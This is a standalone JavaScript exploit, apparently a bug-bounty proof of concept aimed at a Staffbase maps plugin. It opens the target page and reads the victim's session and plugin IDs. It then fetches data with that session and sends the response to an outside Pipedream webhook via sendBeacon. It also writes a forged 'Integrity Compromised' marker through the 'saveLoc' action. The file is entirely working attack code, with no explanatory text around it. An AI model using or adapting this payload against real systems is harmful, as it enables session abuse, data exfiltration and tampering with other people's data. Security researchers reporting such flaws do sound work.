(async function() {
    var webhook = "https://eoeqgca83zpr7tb.m.pipedream.net/";

    var victimWin = window.open("https://hackerone2.staffbase.rocks/api/installations/69877fae9c38bf4b2f40bdb9/service/frontend/forward?locale=en_US&link=%3Ffrontend%3Dtrue");

	await new Promise(r => setTimeout(r, 2000));

    var sid = victimWin.eyo.sessionId;
    var pid = victimWin.eyo.pluginID || victimWin.eyo.pluginInstanceId;
	var baseUrl = "/app/index.php?__v=" + Date.now() + "&pid=" + pid;

    if (!sid || !pid) return;

    function buildBody(action, params) {
        var base = "eyoAction=" + action + "&crossDomain=true&sessionID=" + encodeURIComponent(sid);
        for (var key in params) {
            base += "&" + key + "=" + encodeURIComponent(params[key]);
        }
        return base;
    }

	fetch(baseUrl, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest" },
        body: buildBody("initialLocation", {})
    })
    .then(function(res) { return res.text(); })
    .then(function(data) {
        navigator.sendBeacon(webhook + "?exfiltrated=" + btoa(unescape(encodeURIComponent(data))));

        var newLocation = {
            rowID: -1,
            lat: "52.5200",
            lng: "13.4050",
            locName: "Integrity Compromised",
            locAddress: "This marker was added via XSS on pluginmaps domain.",
            locString: "Berlin, Germany"
        };

        return fetch(baseUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest" },
            body: buildBody("saveLoc", newLocation)
        });
    })
    .then(function(res) { return res.text(); })
    .then(function(result) {
        navigator.sendBeacon(webhook + "?write_status=" + btoa(result));
    })
    .catch(function(err) {
        navigator.sendBeacon(webhook + "?error=" + btoa(err.toString()));
    })
    
})();
